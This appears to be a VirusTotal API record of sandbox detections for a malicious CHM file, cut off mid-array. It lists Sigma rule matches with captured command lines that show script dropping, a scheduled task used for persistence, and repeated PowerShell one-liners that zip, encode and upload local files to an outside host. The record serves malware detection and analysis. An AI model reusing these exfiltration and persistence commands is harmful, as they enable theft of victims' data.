{
    "data":  {
                 "id":  "da79eea1198a1a10e2ffd50fd949521632d8f252fb1aadb57a45218482b9fd89",
                 "type":  "file",
                 "links":  {
                               "self":  "https://www.virustotal.com/api/v3/files/da79eea1198a1a10e2ffd50fd949521632d8f252fb1aadb57a45218482b9fd89"
                           },
                 "attributes":  {
                                    "filecondis":  {
                                                       "raw_md5":  "c22842052037572a119cbc08091d291d",
                                                       "dhash":  "0000000009080000"
                                                   },
                                    "sigma_analysis_results":  [
                                                                   {
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "03c63f09ca0da10cdd578a2b9318266b2f2ac550da5b256d00ce4c0cbbbedda0",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "HTML Help HH.EXE Suspicious Child Process",
                                                                       "rule_description":  "Detects a suspicious child process of a Microsoft HTML Help (HH.exe)",
                                                                       "rule_author":  "Maxim Pavlunin, Nasreddine Bencherchali (Nextron Systems)",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-9C5A-6553-2E06-000000004800}; ProcessId=7256; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows Command Processor; Company=Microsoft Corporation; ParentProcessGuid={C784477D-9C4F-6553-2B06-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE; OriginalFileName=Cmd.Exe; ParentImage=C:\\Windows\\hh.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=5420; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=\"C:\\Windows\\System32\\cmd.exe\" /c start /min cscript C:\\Users\\Public\\Libraries\\emlmanager.vbs; EventID=1; LogonGuid=C784477D-A600-6537-A5CC-030000000000; LogonId=248997; Image=C:\\Windows\\System32\\cmd.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Windows\\hh.exe\" C:\\Users\\george\\Desktop\\[HF].chm; UtcTime=1699978330; RuleName=-}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "0533322c5c44794b71e761cd351a2459aad6e21ae95c9543d4c9fdb3c8fde6c4",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Suspicious Schtasks From Env Var Folder",
                                                                       "rule_description":  "Detects Schtask creations that point to a suspicious folder or an environment variable often used by malware",
                                                                       "rule_author":  "Florian Roth (Nextron Systems)",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-9C5B-6553-3506-000000004800}; ProcessId=7492; Product=Microsoft\\xae Windows\\xae Operating System; Description=Task Scheduler Configuration Tool; Company=Microsoft Corporation; ParentProcessGuid={C784477D-9C5B-6553-3206-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=838D346D1D28F00783B7A6C6BD03A0DA,SHA256=8BE433049CCC271F04A8E625E9FB9BD3BCF15B4EDEB63497C00BD9CE1CD5C50E,IMPHASH=7EE4BC5589713B3470B8A950256E2E69; OriginalFileName=schtasks.exe; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7404; CurrentDirectory=C:\\Users\\Public\\Libraries\\; CommandLine=schtasks  /create /sc minute /mo 2 /tn \"SafeBrowsing\" /tr \"C:\\Users\\Public\\Libraries\\emlmanager.vbs\" /f ; EventID=1; LogonGuid=C784477D-A600-6537-A5CC-030000000000; LogonId=248997; Image=C:\\Windows\\System32\\schtasks.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c C:\\Users\\Public\\Libraries\\2034923.bat; UtcTime=1699978331; RuleName=-}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "1929e853315b3b5398e0837b2b8928a28ae8eec0611ebb41efc5e6b33e78cd6c",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Suspicious PowerShell Parameter Substring",
                                                                       "rule_description":  "Detects suspicious PowerShell invocation with a parameter substring",
                                                                       "rule_author":  "Florian Roth (Nextron Systems), Daniel Bohannon (idea), Roberto Rodriguez (Fix)",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-9C61-6553-4506-000000004800}; ProcessId=8088; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows PowerShell; Company=Microsoft Corporation; ParentProcessGuid={C784477D-9C5B-6553-3206-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; OriginalFileName=PowerShell.EXE; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7404; CurrentDirectory=C:\\Users\\Public\\Libraries\\; CommandLine=powershell  -ep bypass -command \"Add-Type -AssemblyName System.IO.Compression.FileSystem;$l=\u0027https://niscarea.com\u0027;$f=\u0027C:\\Users\\Public\\Libraries\\sys.txt\u0027;$r=[DateTime]::Now.ToString(\u0027MM-dd HH-mm-ss\u0027);$c= [Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($env:COMPUTERNAME));$a=\u0027Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.*; WOW64; Trident/6.0)\u0027;$z=$f+\u0027.zip\u0027;$e=$f+\u0027.enc\u0027;Remove-Item $z -Force;Remove-Item $e -Force;$t=$f.Substring($f.LastIndexOf(\u0027\\\u0027)+1);$h=[System.IO.Compression.ZipFile]::Open($z,\u0027Create\u0027);[System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($h,$f,$t);$h.Dispose();$b=Get-Content $z -Encoding Byte -Raw;[Convert]::ToBase64String($b)|Out-File $e -Encoding ascii;Remove-Item $z -Force;Remove-Item $f -Force;$u=$l+\u0027/in.php?cn=\u0027+$c+\u0027\u0026fn=\u0027+$r;$w=New-Object System.Net.WebClient;$w.Headers.Add(\u0027User-Agent\u0027,$a);$w.UploadFile($u,$e);Remove-Item $e -Force;\"; EventID=1; LogonGuid=C784477D-A600-6537-A5CC-030000000000; LogonId=248997; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c C:\\Users\\Public\\Libraries\\2034923.bat; UtcTime=1699978337; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-9C64-6553-4806-000000004800}; ProcessId=4728; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows PowerShell; Company=Microsoft Corporation; ParentProcessGuid={C784477D-9C5D-6553-3B06-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; OriginalFileName=PowerShell.EXE; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7752; CurrentDirectory=C:\\Users\\Public\\Libraries\\; CommandLine=powershell  -ep bypass -command \"Add-Type -AssemblyName System.IO.Compression.FileSystem;$l=\u0027https://niscarea.com\u0027;$f=\u0027C:\\Users\\Public\\Libraries\\sys.txt\u0027;$r=[DateTime]::Now.ToString(\u0027MM-dd HH-mm-ss\u0027);$c= [Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($env:COMPUTERNAME));$a=\u0027Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.*; WOW64; Trident/6.0)\u0027;$z=$f+\u0027.zip\u0027;$e=$f+\u0027.enc\u0027;Remove-Item $z -Force;Remove-Item $e -Force;$t=$f.Substring($f.LastIndexOf(\u0027\\\u0027)+1);$h=[System.IO.Compression.ZipFile]::Open($z,\u0027Create\u0027);[System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($h,$f,$t);$h.Dispose();$b=Get-Content $z -Encoding Byte -Raw;[Convert]::ToBase64String($b)|Out-File $e -Encoding ascii;Remove-Item $z -Force;Remove-Item $f -Force;$u=$l+\u0027/in.php?cn=\u0027+$c+\u0027\u0026fn=\u0027+$r;$w=New-Object System.Net.WebClient;$w.Headers.Add(\u0027User-Agent\u0027,$a);$w.UploadFile($u,$e);Remove-Item $e -Force;\"; EventID=1; LogonGuid=C784477D-A600-6537-CFCC-030000000000; LogonId=249039; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=Medium; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c C:\\Users\\Public\\Libraries\\2034923.bat; UtcTime=1699978340; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-9C69-6553-4A06-000000004800}; ProcessId=6776; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows PowerShell; Company=Microsoft Corporation; ParentProcessGuid={C784477D-9C5B-6553-3206-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; OriginalFileName=PowerShell.EXE; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7404; CurrentDirectory=C:\\Users\\Public\\Libraries\\; CommandLine=powershell  -ep bypass -command \"Add-Type -AssemblyName System.IO.Compression.FileSystem;$l=\u0027https://niscarea.com\u0027;$f=\u0027C:\\Users\\Public\\Libraries\\tsklt.txt\u0027;$r=[DateTime]::Now.ToString(\u0027MM-dd HH-mm-ss\u0027);$c= [Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($env:COMPUTERNAME));$a=\u0027Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.*; WOW64; Trident/6.0)\u0027;$z=$f+\u0027.zip\u0027;$e=$f+\u0027.enc\u0027;Remove-Item $z -Force;Remove-Item $e -Force;$t=$f.Substring($f.LastIndexOf(\u0027\\\u0027)+1);$h=[System.IO.Compression.ZipFile]::Open($z,\u0027Create\u0027);[System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($h,$f,$t);$h.Dispose();$b=Get-Content $z -Encoding Byte -Raw;[Convert]::ToBase64String($b)|Out-File $e -Encoding ascii;Remove-Item $z -Force;Remove-Item $f -Force;$u=$l+\u0027/in.php?cn=\u0027+$c+\u0027\u0026fn=\u0027+$r;$w=New-Object System.Net.WebClient;$w.Headers.Add(\u0027User-Agent\u0027,$a);$w.UploadFile($u,$e);Remove-Item $e -Force;\"; EventID=1; LogonGuid=C784477D-A600-6537-A5CC-030000000000; LogonId=248997; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c C:\\Users\\Public\\Libraries\\2034923.bat; UtcTime=1699978345; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-9C6B-6553-4C06-000000004800}; ProcessId=7372; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows PowerShell; Company=Microsoft Corporation; ParentProcessGuid={C784477D-9C5D-6553-3B06-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; OriginalFileName=PowerShell.EXE; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7752; CurrentDirectory=C:\\Users\\Public\\Libraries\\; CommandLine=powershell  -ep bypass -command \"Add-Type -AssemblyName System.IO.Compression.FileSystem;$l=\u0027https://niscarea.com\u0027;$f=\u0027C:\\Users\\Public\\Libraries\\tsklt.txt\u0027;$r=[DateTime]::Now.ToString(\u0027MM-dd HH-mm-ss\u0027);$c= [Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($env:COMPUTERNAME));$a=\u0027Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.*; WOW64; Trident/6.0)\u0027;$z=$f+\u0027.zip\u0027;$e=$f+\u0027.enc\u0027;Remove-Item $z -Force;Remove-Item $e -Force;$t=$f.Substring($f.LastIndexOf(\u0027\\\u0027)+1);$h=[System.IO.Compression.ZipFile]::Open($z,\u0027Create\u0027);[System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($h,$f,$t);$h.Dispose();$b=Get-Content $z -Encoding Byte -Raw;[Convert]::ToBase64String($b)|Out-File $e -Encoding ascii;Remove-Item $z -Force;Remove-Item $f -Force;$u=$l+\u0027/in.php?cn=\u0027+$c+\u0027\u0026fn=\u0027+$r;$w=New-Object System.Net.WebClient;$w.Headers.Add(\u0027User-Agent\u0027,$a);$w.UploadFile($u,$e);Remove-Item $e -Force;\"; EventID=1; LogonGuid=C784477D-A600-6537-CFCC-030000000000; LogonId=249039; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=Medium; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c C:\\Users\\Public\\Libraries\\2034923.bat; UtcTime=1699978347; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-9C72-6553-4E06-000000004800}; ProcessId=6832; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows PowerShell; Company=Microsoft Corporation; ParentProcessGuid={C784477D-9C5B-6553-3206-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; OriginalFileName=PowerShell.EXE; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7404; CurrentDirectory=C:\\Users\\Public\\Libraries\\; CommandLine=powershell  -ep bypass -command \"Add-Type -AssemblyName System.IO.Compression.FileSystem;$l=\u0027https://niscarea.com\u0027;$f=\u0027C:\\Users\\Public\\Libraries\\desk.txt\u0027;$r=[DateTime]::Now.ToString(\u0027MM-dd HH-mm-ss\u0027);$c= [Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($env:COMPUTERNAME));$a=\u0027Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.*; WOW64; Trident/6.0)\u0027;$z=$f+\u0027.zip\u0027;$e=$f+\u0027.enc\u0027;Remove-Item $z -Force;Remove-Item $e -Force;$t=$f.Substring($f.LastIndexOf(\u0027\\\u0027)+1);$h=[System.IO.Compression.ZipFile]::Open($z,\u0027Create\u0027);[System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($h,$f,$t);$h.Dispose();$b=Get-Content $z -Encoding Byte -Raw;[Convert]::ToBase64String($b)|Out-File $e -Encoding ascii;Remove-Item $z -Force;Remove-Item $f -Force;$u=$l+\u0027/in.php?cn=\u0027+$c+\u0027\u0026fn=\u0027+$r;$w=New-Object System.Net.WebClient;$w.Headers.Add(\u0027User-Agent\u0027,$a);$w.UploadFile($u,$e);Remove-Item $e -Force;\"; EventID=1; LogonGuid=C784477D-A600-6537-A5CC-030000000000; LogonId=248997; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c C:\\Users\\Public\\Libraries\\2034923.bat; UtcTime=1699978354; RuleName=-}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "2020feadc9b3cf47558c219948361d9d3eb5347af91135f21bf711f6032bc817",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "WScript or CScript Dropper",
                                                                       "rule_description":  "Detects wscript/cscript executions of scripts located in user directories",
                                                                       "rule_author":  "Margaritis Dimitrios (idea), Florian Roth (Nextron Systems), oscd.community",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-9C5A-6553-3006-000000004800}; ProcessId=7312; Product=Microsoft \\xae Windows Script Host; Description=Microsoft \\xae Console Based Script Host; Company=Microsoft Corporation; ParentProcessGuid={C784477D-9C5A-6553-2E06-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=956185CAF895737F30E8EE24DEFCE8E6,SHA256=0E54A952CD1C5CECBAC0B00155F6094939484C47CE130AAC3441058DA60BAFA5,IMPHASH=AC41732425A8C1DC99B4B3CE314D9654; OriginalFileName=cscript.exe; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=5.812.10240.16384; ParentProcessId=7256; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=cscript  C:\\Users\\Public\\Libraries\\emlmanager.vbs; EventID=1; LogonGuid=C784477D-A600-6537-A5CC-030000000000; LogonId=248997; Image=C:\\Windows\\System32\\cscript.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Windows\\System32\\cmd.exe\" /c start /min cscript C:\\Users\\Public\\Libraries\\emlmanager.vbs; UtcTime=1699978330; RuleName=-}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "2d15bc5d08223728e30ed4330ad99024b1467ac8ddb073e7ed368b0468898e80",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Legitimate Application Dropped Script",
                                                                       "rule_description":  "Detects programs on a Windows system that should not write scripts to disk",
                                                                       "rule_author":  "frack113, Florian Roth (Nextron Systems)",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{EventID=11; ProcessId=7176; TargetFilename=C:\\Users\\Public\\Libraries\\1295049.bat; RuleName=-; CreationUtcTime=1699978321; UtcTime=1699978321; ProcessGuid={C784477D-9C51-6553-2D06-000000004800}; Image=C:\\Windows\\hh.exe}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{EventID=11; ProcessId=7176; Image=C:\\Windows\\hh.exe; RuleName=-; CreationUtcTime=1699978321; UtcTime=1699978321; ProcessGuid={C784477D-9C51-6553-2D06-000000004800}; TargetFilename=C:\\Users\\Public\\Libraries\\2034923.bat}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{EventID=11; ProcessId=7176; Image=C:\\Windows\\hh.exe; RuleName=-; CreationUtcTime=1699978321; UtcTime=1699978321; ProcessGuid={C784477D-9C51-6553-2D06-000000004800}; TargetFilename=C:\\Users\\Public\\Libraries\\3059602.bat}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{EventID=11; ProcessId=7176; TargetFilename=C:\\Users\\Public\\Libraries\\4959032.bat; RuleName=-; CreationUtcTime=1699978321; UtcTime=1699978321; ProcessGuid={C784477D-9C51-6553-2D06-000000004800}; Image=C:\\Windows\\hh.exe}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{EventID=11; ProcessId=7176; Image=C:\\Windows\\hh.exe; ProcessGuid={C784477D-9C51-6553-2D06-000000004800}; CreationUtcTime=1699978321; UtcTime=1699978321; RuleName=-; TargetFilename=C:\\Users\\Public\\Libraries\\5923924.bat}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "92acfd50d9fe4d995d6998a5346e4e031ea037d422458bb4f74555a52ffc886c",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Script Interpreter Execution From Suspicious Folder",
                                                                       "rule_description":  "Detects a suspicious script execution in temporary folders or folders accessible by environment variables",
                                                                       "rule_author":  "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-9C5A-6553-3006-000000004800}; ProcessId=7312; Product=Microsoft \\xae Windows Script Host; Description=Microsoft \\xae Console Based Script Host; Company=Microsoft Corporation; ParentProcessGuid={C784477D-9C5A-6553-2E06-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=956185CAF895737F30E8EE24DEFCE8E6,SHA256=0E54A952CD1C5CECBAC0B00155F6094939484C47CE130AAC3441058DA60BAFA5,IMPHASH=AC41732425A8C1DC99B4B3CE314D9654; OriginalFileName=cscript.exe; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=5.812.10240.16384; ParentProcessId=7256; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=cscript  C:\\Users\\Public\\Libraries\\emlmanager.vbs; EventID=1; LogonGuid=C784477D-A600-6537-A5CC-030000000000; LogonId=248997; Image=C:\\Windows\\System32\\cscript.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Windows\\System32\\cmd.exe\" /c start /min cscript C:\\Users\\Public\\Libraries\\emlmanager.vbs; UtcTime=1699978330; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-9C61-6553-4506-000000004800}; ProcessId=8088; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows PowerShell; Company=Microsoft Corporation; ParentProcessGuid={C784477D-9C5B-6553-3206-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; OriginalFileName=PowerShell.EXE; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7404; CurrentDirectory=C:\\Users\\Public\\Libraries\\; CommandLine=powershell  -ep bypass -command \"Add-Type -AssemblyName System.IO.Compression.FileSystem;$l=\u0027https://niscarea.com\u0027;$f=\u0027C:\\Users\\Public\\Libraries\\sys.txt\u0027;$r=[DateTime]::Now.ToString(\u0027MM-dd HH-mm-ss\u0027);$c= [Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($env:COMPUTERNAME));$a=\u0027Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.*; WOW64; Trident/6.0)\u0027;$z=$f+\u0027.zip\u0027;$e=$f+\u0027.enc\u0027;Remove-Item $z -Force;Remove-Item $e -Force;$t=$f.Substring($f.LastIndexOf(\u0027\\\u0027)+1);$h=[System.IO.Compression.ZipFile]::Open($z,\u0027Create\u0027);[System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($h,$f,$t);$h.Dispose();$b=Get-Content $z -Encoding Byte -Raw;[Convert]::ToBase64String($b)|Out-File $e -Encoding ascii;Remove-Item $z -Force;Remove-Item $f -Force;$u=$l+\u0027/in.php?cn=\u0027+$c+\u0027\u0026fn=\u0027+$r;$w=New-Object System.Net.WebClient;$w.Headers.Add(\u0027User-Agent\u0027,$a);$w.UploadFile($u,$e);Remove-Item $e -Force;\"; EventID=1; LogonGuid=C784477D-A600-6537-A5CC-030000000000; LogonId=248997; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c C:\\Users\\Public\\Libraries\\2034923.bat; UtcTime=1699978337; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-9C64-6553-4806-000000004800}; ProcessId=4728; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows PowerShell; Company=Microsoft Corporation; ParentProcessGuid={C784477D-9C5D-6553-3B06-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; OriginalFileName=PowerShell.EXE; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7752; CurrentDirectory=C:\\Users\\Public\\Libraries\\; CommandLine=powershell  -ep bypass -command \"Add-Type -AssemblyName System.IO.Compression.FileSystem;$l=\u0027https://niscarea.com\u0027;$f=\u0027C:\\Users\\Public\\Libraries\\sys.txt\u0027;$r=[DateTime]::Now.ToString(\u0027MM-dd HH-mm-ss\u0027);$c= [Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($env:COMPUTERNAME));$a=\u0027Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.*; WOW64; Trident/6.0)\u0027;$z=$f+\u0027.zip\u0027;$e=$f+\u0027.enc\u0027;Remove-Item $z -Force;Remove-Item $e -Force;$t=$f.Substring($f.LastIndexOf(\u0027\\\u0027)+1);$h=[System.IO.Compression.ZipFile]::Open($z,\u0027Create\u0027);[System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($h,$f,$t);$h.Dispose();$b=Get-Content $z -Encoding Byte -Raw;[Convert]::ToBase64String($b)|Out-File $e -Encoding ascii;Remove-Item $z -Force;Remove-Item $f -Force;$u=$l+\u0027/in.php?cn=\u0027+$c+\u0027\u0026fn=\u0027+$r;$w=New-Object System.Net.WebClient;$w.Headers.Add(\u0027User-Agent\u0027,$a);$w.UploadFile($u,$e);Remove-Item $e -Force;\"; EventID=1; LogonGuid=C784477D-A600-6537-CFCC-030000000000; LogonId=249039; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=Medium; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c C:\\Users\\Public\\Libraries\\2034923.bat; UtcTime=1699978340; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-9C69-6553-4A06-000000004800}; ProcessId=6776; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows PowerShell; Company=Microsoft Corporation; ParentProcessGuid={C784477D-9C5B-6553-3206-000000004800}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; OriginalFileName=PowerShell.EXE; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7404; CurrentDirectory=C:\\Users\\Public\\Libraries\\; CommandLine=powershell  -ep bypass -command \"Add-Type -AssemblyName System.IO.Compression.FileSystem;$l=\u0027https://niscarea.com\u0027;$f=\u0027C:\\Users\\Public\\Libraries\\tsklt.txt\u0027;$r=[DateTime]::Now.ToString(\u0027MM-dd HH-mm-ss\u0027);$c= [Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($env:COMPUTERNAME));$a=\u0027Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.*; WOW64; Trident/6.0)\u0027;$z=$f+\u0027.zip\u0027;$e=$f+\u0027.enc\u0027;Remove-Item $z -Force;Remove-Item $e -Force;$t=$f.Substring($f.LastIndexOf(\u0027\\\u0027)+1);$h=[System.IO.Compression.ZipFile]::Open($z,\u0027Create\u0027);[System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($h,$f,$t);$h.Dispose();$b=Get-Content $z -Encoding Byte -Raw;[Convert]::ToBase64String($b)|Out-File $e -Encoding ascii;Remove-Item $z -Force;Remove-Item $f -Force;$u=$l+\u0027/in.php?cn=\u0027+$c+\u0027\u0026fn=\u0027+$r;$w=New-Object System.Net.WebClient;$w.Headers.Add(\u0027User-Agent\u0027,$a);$w.UploadFile($u,$e);Remove-Item $e -Force;\"; EventID=1; LogonGuid=C784477D-A600-6537-A5CC-030000000000; LogonId=248997; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c C:\\Users\\Public\\Libraries\\2034923.bat; UtcTime=1699978345; RuleName=-}"
                                                                                             },
                                                                                             {
